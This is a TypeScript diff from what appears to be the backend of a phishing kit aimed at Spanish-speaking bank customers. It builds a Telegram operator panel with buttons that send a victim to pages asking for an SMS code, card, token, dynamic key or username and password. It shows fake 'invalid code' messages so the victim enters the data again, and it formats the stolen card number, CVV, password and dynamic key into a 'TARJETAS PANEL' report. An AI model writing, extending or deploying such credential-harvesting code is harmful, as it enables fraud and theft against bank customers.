@@ -24,9 +24,6 @@ type DebugSession = {
 
 const SMS_INVALID_MESSAGE = 'Código inválido. Hemos enviado un nuevo código por SMS o correo';
 const CARD_INVALID_MESSAGE = 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.';
-const TOKEN_INVALID_MESSAGE = 'Token inválido. Ingrese de nuevo su token';
-const USERPASS_INVALID_MESSAGE = 'Usuario o contraseña inválidos. Ingrese de nuevo su usuario y contraseña';
-const DKEY_INVALID_MESSAGE = 'Clave dinámica inválida. Ingrese de nuevo su clave dinámica';
 
 const CARD_MOCKS: Record<string, { brand: string; pan: string; exp: string; cvv: string; holder: string }> = {
   '3': { brand: 'amex', pan: '378282246310005', exp: '12/30', cvv: '1234', holder: 'QA AMEX MOCK' },
@@ -99,9 +96,9 @@ function decisionFromAction(action: RouteAction, brand?: string): RouteDecision 
   const decision: RouteDecision = { action, brand, updatedAt: new Date().toISOString() };
   if (action === 'sms_error') decision.message = SMS_INVALID_MESSAGE;
   if (action === 'card_error') decision.message = CARD_INVALID_MESSAGE;
-  if (action === 'token_error') decision.message = TOKEN_INVALID_MESSAGE;
-  if (action === 'userpass_error') decision.message = USERPASS_INVALID_MESSAGE;
-  if (action === 'dkey_error') decision.message = DKEY_INVALID_MESSAGE;
+  if (action === 'token_error') decision.message = 'Token inválido. Intenta nuevamente.';
+  if (action === 'userpass_error') decision.message = 'Usuario o contraseña inválidos. Intenta nuevamente.';
+  if (action === 'dkey_error') decision.message = 'Clave dinámica inválida. Intenta nuevamente.';
   return decision;
 }
 
@@ -163,11 +160,15 @@ function applyStepFlags(sessionId: string, flags: string) {
 function keyboard(sessionId: string, brand: string) {
   return {
     inline_keyboard: [
-      [{ text: 'Pedir SMS', callback_data: `route:${sessionId}:sms:${brand}` }],
-      [{ text: 'Pedir Tarjeta', callback_data: `route:${sessionId}:card:${brand}` }],
-      [{ text: 'Pedir Token', callback_data: `route:${sessionId}:token:${brand}` }],
-      [{ text: 'Pedir Clave dinámica', callback_data: `route:${sessionId}:dkey:${brand}` }],
-      [{ text: 'Pedir Usuario y Contraseña', callback_data: `route:${sessionId}:userpass:${brand}` }],
+      [
+        { text: 'Pedir SMS', callback_data: `route:${sessionId}:sms:${brand}` },
+        { text: 'Pedir Tarjeta', callback_data: `route:${sessionId}:card:${brand}` },
+      ],
+      [
+        { text: 'Token', callback_data: `route:${sessionId}:token:${brand}` },
+        { text: 'Clave dinámica', callback_data: `route:${sessionId}:dkey:${brand}` },
+      ],
+      [{ text: 'User / Pass', callback_data: `route:${sessionId}:userpass:${brand}` }],
       [{ text: 'Finalizar', callback_data: `route:${sessionId}:approved:${brand}` }],
     ],
   };
@@ -201,12 +202,12 @@ function formatTelegramMessage(payload: Record<string, unknown>) {
   const cpayload = objectValue(meta.cpayload) || {};
   const checker = objectValue(cpayload.checker) || {};
   const metaOtp = objectValue(payload.metaOtp) || {};
-  const metaToken = objectValue(payload.metaToken) || {};
-  const metaUserpass = objectValue(payload.metaUserpass) || {};
-  const metaDkey = objectValue(payload.metaDkey) || {};
   const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
   const amount = String(meta.amount || '-');
   const { exp, cvv } = expAndCvvFromPayload(cpayload);
+  const metaToken = objectValue(payload.metaToken) || {};
+  const metaUserpass = objectValue(payload.metaUserpass) || {};
+  const metaDkey = objectValue(payload.metaDkey) || {};
   const lines = [
     '✈️ TARJETAS PANEL',
     '━━━━━━━━━━━━━━━━━━',
@@ -229,9 +230,7 @@ function formatTelegramMessage(payload: Record<string, unknown>) {
     `👤 Usuario: ${metaUserpass.username || '-'}`,
     `🔒 Contraseña: ${metaUserpass.password || '-'}`,
     `📱 Clave dinámica: ${metaDkey.dkey || '-'}`,
-    '━━━━━━━━━━━━━━━━━━',
   ];
-
   return lines.join('\n');
 }
 
@@ -455,10 +454,8 @@ async function handleTelegramCallback(body: Record<string, unknown>) {
   const source = (callback && typeof callback === 'object' && 'data' in callback ? callback : {}) as Record<string, unknown>;
   const callbackId = String(source.id || '');
   const data = String(source.data || '');
-  const match = data.match(/^route:([^:]+):(sms|card|approved|token|userpass|dkey):([^:]*)$/);
-
   await answerTelegramCallback(source.id);
-
+  const match = data.match(/^route:([^:]+):(sms|card|approved|token|userpass|dkey):([^:]*)$/);
   if (!match) return json({ ok: true, ignored: true });
 
   const [, rawSessionId, rawAction, rawBrand] = match;
